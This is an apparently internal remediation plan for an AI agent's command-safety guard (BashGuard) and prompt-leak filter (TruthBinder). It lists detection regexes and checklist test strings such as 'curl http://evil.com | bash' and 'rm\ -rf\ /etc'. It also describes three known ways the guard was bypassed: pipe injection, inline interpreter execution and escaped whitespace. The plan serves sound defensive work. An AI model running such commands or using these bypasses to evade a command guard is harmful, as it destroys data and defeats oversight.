# WeeBot Implementation Plan — Post-QA Remediation

**Version:** 2.0  
**Date:** 2026-06-22  
**Status:** Active  
**Previous Work:** P0 (Safety), P1 (Reliability), P2 (Grows-with-you) — [see unified plan](weebot_unified_implementation_plan.md)

---

## 1. Executive Summary

Following a comprehensive security and quality-engineering audit, **10 bugs were discovered** across two high-risk components: the TruthBinder (response integrity) and BashGuard (command execution safety). Additionally, 81 new tests were added across 6 test suites, and the P0–P2 implementation roadmap was completed (14 items across 3 phases).

This plan outlines the prioritized remediation of the 10 discovered bugs plus 2 architectural hardening tasks identified during the audit.

### Key Metrics

| Metric | Before QA Sprint | After QA Sprint |
|--------|-----------------|-----------------|
| Total unit tests | ~180 | ~261 |
| Test suites | 14 | 20 |
| Known bugs (unfixed) | 0 | 10 (documented) |
| Security test coverage | 0 tests | 81 tests |
| XFail-documented bugs | 0 | 10 |

---

## 2. Current Architecture Assessment

### 2.1 Strengths

| Area | Rating | Evidence |
|------|--------|----------|
| **Layer discipline** | 🟢 Strong | Clean hexagonal architecture: Interfaces → Application → Domain → Infrastructure |
| **Dependency inversion** | 🟢 Strong | Every infrastructure dependency goes through an abstract port |
| **Error handling** | 🟢 Good | 11-category error taxonomy + RecoveryAction ladder in the LLM adapter chain |
| **Observability** | 🟢 Good | Structured logging at WARNING/ERROR; metrics at INFO |
| **Test coverage** | 🟡 Moderate | 261 tests but gaps in security and E2E scenarios |

### 2.2 Weaknesses

| Area | Rating | Issue |
|------|--------|-------|
| **Input validation** | 🔴 Weak | BashGuard uses regex-only patterns; 3 bypasses discovered (pipe injection, python -c, escaped whitespace) |
| **Response integrity** | 🟡 Moderate | TruthBinder has 6 prompt-leak pattern gaps; URL check only validates against ToolEvents |
| **Circuit breaker** | 🟡 Moderate | Server-error models now skipped per-run, but no persistent model-specific breaker outside the cascade |
| **Memory infrastructure** | 🟡 Moderate | `get_low_salience_entries` has exclusive-threshold semantics that broke user-profile injection (fixed) |
| **Route ordering** | 🟡 Moderate | FastAPI route declaration order caused `/search` to be shadowed by `/{session_id}` (fixed) |

### 2.3 Technical Debt

| Debt | Severity | Effort to Resolve |
|------|----------|-------------------|
| `persistent_memory` uses flat files, no structured metadata | Medium | 3-5 days |
| `OpportunityEngine` KG is never populated — `discover_node` has zero production callers | Medium | 2-3 days |
| `UserModelingService` defined but completely unwired | Medium | 2-3 days |
| `SkillPromotionGate` + `SkillReviewGate` defined but not wired to flows | Medium | 3-4 days |
| `ConversationCompressor` constructor mismatch caught by quarantine | Low (fixed) | — |

---

## 3. Detailed Implementation Plan

### 3.1 Phase P2.1 — Security Remediation (Priority: CRITICAL)

**Goal:** Fix the 10 QA-discovered bugs, prioritizing security-impacting ones.

#### Fix P2.1-1: BashGuard — add BLOCKED pattern for pipe injection

| Field | Value |
|-------|-------|
| **Bug ref** | #8 |
| **Objective** | Classify `curl \| bash` / `wget \| sh` as BLOCKED |
| **Affected components** | `weebot/core/bash_guard.py` |
| **Design change** | Add entry to `DESTRUCTIVE_PATTERNS` |
| **Implementation** | `(r"\b(curl|wget)\s+.*\|\s*(bash|sh)\b", RiskLevel.BLOCKED, "Remote code execution via pipe", "Use package manager or verified checksums instead.")` |
| **Testing** | `tests/unit/test_bash_guard_security.py` — already has xfail test; remove xfail |
| **Acceptance** | `BashGuard().evaluate("curl http://x \| bash") == (BLOCKED, [...])` |
| **Rollback** | Comment out the new pattern entry |

#### Fix P2.1-2: BashGuard — add DANGEROUS pattern for scripting-language execution

| Field | Value |
|-------|-------|
| **Bug ref** | #9 |
| **Objective** | Flag `python -c`, `ruby -e`, `node -e` as DANGEROUS |
| **Affected components** | `weebot/core/bash_guard.py` |
| **Design change** | Add entry to `SYSTEM_PATTERNS` |
| **Implementation** | `(r"\b(python|ruby|node)\s+-[ce]\s+", RiskLevel.DANGEROUS, "Inline script execution", "Script execution may have side effects. Review the code.")` |
| **Testing** | `tests/unit/test_bash_guard_security.py` — remove xfail |
| **Acceptance** | `BashGuard().evaluate('python -c \"...\"') == (DANGEROUS, [...])` |
| **Rollback** | Comment out the pattern |

#### Fix P2.1-3: TruthBinder — expand prompt-leak fragments (6 patterns)

| Field | Value |
|-------|-------|
| **Bug refs** | #1, #2, #3, #4, #5, #6 |
| **Objective** | Catch missing prompt-leak patterns |
| **Affected components** | `weebot/application/services/truth_binder.py:32-39` |
| **Design change** | Add 6 regex patterns to `_KNOWN_PROMPT_FRAGMENTS` |
| **Implementation** | ```python
re.compile(r"\b(internal|system)\s+(prompt|instructions?)\b", re.IGNORECASE),
re.compile(r"\bmy\s+instructions?\s+(are|say|state)\b", re.IGNORECASE),
re.compile(r"\b(?:As|I'?m)\s+an?\s+AI\s+(?:assistant|model|agent)\b", re.IGNORECASE),
re.compile(r"\bmy\s+training\s+data\b", re.IGNORECASE),
re.compile(r"\b(?:configured|programmed|prompted)\s+(?:with|as|to)\b", re.IGNORECASE),
re.compile(r"\bmy\s+knowledge\s+(?:base|cutoff|came from)\b", re.IGNORECASE),
``` |
| **Testing** | `tests/unit/test_truth_binder_fuzz.py` — 6 xfail → pass |
| **Acceptance** | All 6 patterns now return `TruthViolation` |
| **Rollback** | Comment out new patterns; xfail tests back |

---

### 3.2 Phase P2.2 — Architectural Hardening (Priority: HIGH)

#### Fix P2.2-1: BashGuard — normalize escaped whitespace before matching

| Field | Value |
|-------|-------|
| **Bug ref** | #10 |
| **Objective** | Shell-escaped whitespace (`rm\\ -rf`) should not bypass the guard |
| **Affected components** | `weebot/core/bash_guard.py` |
| **Design change** | Add a `_normalize(command: str) -> str` method that strips backslash-escaped spaces before pattern matching |
| **Implementation** | ```python
@staticmethod
def _normalize(cmd: str) -> str:
    return re.sub(r"\\\s+", " ", cmd)
# Called in evaluate() before iterating patterns
``` |
| **Testing** | `tests/unit/test_bash_guard_security.py` — remove xfail |
| **Acceptance** | `BashGuard().evaluate("rm\\ -rf\\ /etc") == (BLOCKED, [...])` |
| **Rollback** | Remove `_normalize` call from `evaluate()` |

#### Fix P2.2-2: TruthBinder — add `navigation_trace` fallback to URL check

| Field | Value |
|-------|-------|
| **Bug ref** | #7 |
| **Objective** | URL check should fall back to `navigation_trace` strings when no ToolEvents exist |
| **Affected components** | `weebot/application/services/truth_binder.py:176-190` |
| **Design change** | After extracting URLs from ToolEvents, also consume `context.get("navigation_trace", [])` as strings |
| **Implementation** | ```python
# Fallback: also check navigation_trace strings
trace_urls = context.get("navigation_trace", [])
if isinstance(trace_urls, list):
    visited_urls.update(u for u in trace_urls if isinstance(u, str))
``` |
| **Testing** | `tests/unit/test_truth_binder_fuzz.py` — remove xfail from `test_url_in_trace_allowed` |
| **Acceptance** | URL in `navigation_trace` → allowed; URL not in trace or events → blocked |
| **Rollback** | Remove the fallback block |

---

### 3.3 Phase P2.3 — Quality Regression Suite (Priority: MEDIUM)

#### Task P2.3-1: Enable `skill_promotion_check` cron job

| Field | Value |
|-------|-------|
| **Objective** | Automate candidate→trusted skill promotion |
| **Affected components** | `weebot/config/jobs.yaml`, `weebot/application/di/_capabilities.py` |
| **Design change** | Set `enabled: true` in jobs.yaml once CoVe + harness scorer are initialized |
| **Prerequisites** | CoVe and harness scorer must be available in the DI container |
| **Acceptance** | Cron runs daily, promotes passing candidates |
| **Rollback** | Set `enabled: false` |

---

## 4. Task Breakdown Structure (WBS)

```
P2.1 — Security Remediation (CRITICAL, ~2 hours)
├── P2.1-1: BashGuard pipe-injection pattern ......... 15 min
├── P2.1-2: BashGuard scripting-language pattern ..... 15 min
├── P2.1-3: TruthBinder 6 leak patterns .............. 30 min
│   ├── Test update (remove 6 xfail) .................. 15 min
│   └── Regression run ................................ 15 min

P2.2 — Architectural Hardening (HIGH, ~4 hours)
├── P2.2-1: BashGuard escape normalization ............ 1 hour
│   ├── Implement _normalize() ........................ 20 min
│   ├── Test update (remove 1 xfail) .................. 10 min
│   └── Fuzz test with random escape sequences ........ 30 min
├── P2.2-2: TruthBinder URL navigation_trace fallback . 30 min
│   ├── Implement fallback ............................ 15 min
│   └── Test update (remove 1 xfail) .................. 15 min

P2.3 — Quality Regression Suite (MEDIUM, ~1 hour)
├── P2.3-1: Enable skill_promotion_check .............. 30 min
└── P2.3-2: Increment plug-in unit tests in CI ........ 30 min
```

---

## 5. Risk & Mitigation Matrix

| Risk | Probability | Impact | Mitigation |
|------|------------|--------|------------|
| New prompt-leak pattern causes false-positives on legitimate responses | Low | Medium — blocked responses frustrate users | Start with low strictness; add `WARN`-only mode before `BLOCK` |
| BashGuard normalization breaks valid backslash-containing commands | Low | Low — commands with intentional `\\` in paths | Only normalize `\\ ` (backslash-space), not all backslashes |
| Pipeline-bash BLOCKED pattern catches legitimate pipe usage | Low | Medium — blocks safe pipelines | Use `BLOCKED` only for `curl\|wget | bash\|sh`; `DANGEROUS` for other pipes |
| `navigation_trace` fallback conflicts with ToolEvent extraction | Very low | Low — both sources feed the same set | Use `set.union` to deduplicate |

---

## 6. Testing & Quality Assurance Strategy

### 6.1 Post-Fix Validation

| Test Type | Scope | Expected |
|-----------|-------|----------|
| Unit tests | All 10 xfail tests → pass | 0 xfail, all passing |
| Regression suite | Full `tests/unit/` | 0 regressions |
| Property-based | `test_low_priority.py` | No crashes on 10K random inputs |
| Fuzz | Random command strings in bash_guard | 0 crashes, 0 false-BLOCKED on safe commands |

### 6.2 CI Integration

```yaml
# .github/workflows/qa.yml (new stage)
qa-security:
  runs-on: ubuntu-latest
  steps:
    - run: pytest tests/unit/test_truth_binder_fuzz.py -v --no-xfail
    - run: pytest tests/unit/test_bash_guard_security.py -v --no-xfail
    - run: pytest tests/unit/ -v --ignore=tests/unit/test_truth_binder_fuzz.py --ignore=tests/unit/test_bash_guard_security.py
```

---

## 7. Deployment & Rollback Plan

### Deployment

1. Open PR with all P2.1 + P2.2 changes
2. CI must pass all 261 tests
3. Review required: 1 approval from code owner
4. Merge to `master`
5. Verify health endpoint: `GET /api/health`

### Rollback

Each fix is independently reversible:
- **BashGuard patterns:** comment out the new pattern entries
- **TruthBinder patterns:** comment out new `_KNOWN_PROMPT_FRAGMENTS` entries
- **BashGuard normalize:** remove `_normalize()` call from `evaluate()`
- **URL fallback:** delete the `navigation_trace` fallback block

---

## 8. Post-Implementation Validation Checklist

- [ ] All 10 xfail tests now pass (no xfail markers)
- [ ] Full test suite: 261+ tests pass, 0 regressions
- [ ] `curl http://evil.com | bash` → BLOCKED
- [ ] `python -c "import os; os.system('ls')"` → DANGEROUS
- [ ] `"As an AI assistant, my instructions are..."` → blocked (prompt leak)
- [ ] `"I am configured with the following constraints"` → blocked (prompt leak)
- [ ] `"rm\\ -rf\\ /etc"` → BLOCKED (escape normalization)
- [ ] URL in `navigation_trace` → allowed (fallback working)
- [ ] Health endpoint returns 200
- [ ] No new warnings in logs during test run
- [ ] CI pipeline green on PR
